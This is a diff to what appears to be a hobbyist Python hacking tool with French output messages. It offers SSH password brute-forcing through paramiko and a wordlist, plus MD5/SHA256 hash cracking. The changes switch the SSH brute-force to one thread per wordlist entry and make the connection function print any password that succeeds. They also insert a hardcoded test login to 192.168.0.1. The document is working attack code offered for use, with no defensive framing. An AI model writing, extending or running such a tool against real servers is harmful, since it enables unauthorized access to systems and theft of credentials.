@@ -13,6 +13,7 @@
 
 import pyfiglet,sys,time,hashlib
 import paramiko
+from threading import Thread
 
 
 def section_print(title):
@@ -29,7 +30,7 @@ def hash_cracker(wordlist, type, input):
                                 hash_ob = hashlib.md5(line.strip().encode())
                         elif type == 'sha256':
                                 hash_ob = hashlib.sha256(line.strip().encode())
-                        
+
                         hashed_pass = hash_ob.hexdigest()
                         if hashed_pass == input:
                                 end = time.time()
@@ -44,6 +45,7 @@ def menu():
         x = int(input("Choose your service :\n 1. SSH.\n 2. HTTP.\n\n>"))
 
         if x == 1:
+                print(ssh_connect('192.168.0.1', 'user', 'user'))
                 section_print("SSH BruteForce")
                 ip = str(input("Enter SSH IP :\n>"))
                 user = str(input("Enter username :\n>"))
@@ -58,16 +60,22 @@ def ssh_connect(ip, username, password, port=22):
         ssh = paramiko.SSHClient()
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         ssh.connect(ip, port, username, password)
-
-        return (True, password)
+        print("Mot de passe: " + password)
+        return True
     except:
         return False
 
 def ssh_bruteforce(ip, username, wordlist):
-        with open(f"wordlists\{wordlist}.txt", 'r') as file:
-                for line in file.readlines():
-                        if ssh_connect(ip, username, line.strip().encode(), port=22):
-                                print(f"Mot de passe trouvé ! : {line.strip().encode()}")
+    arr = []
+    with open(f"wordlists\{wordlist}.txt", 'r') as file:
+        for line in file.readlines():
+            th = Thread(target=ssh_connect ,args=(ip, username, line.strip()))
+            th.start()
+
+            """
+            if result[0]:
+                print(f"Mot de passe trouvé ! : {line.strip()}")
+            """
 
 
 try:
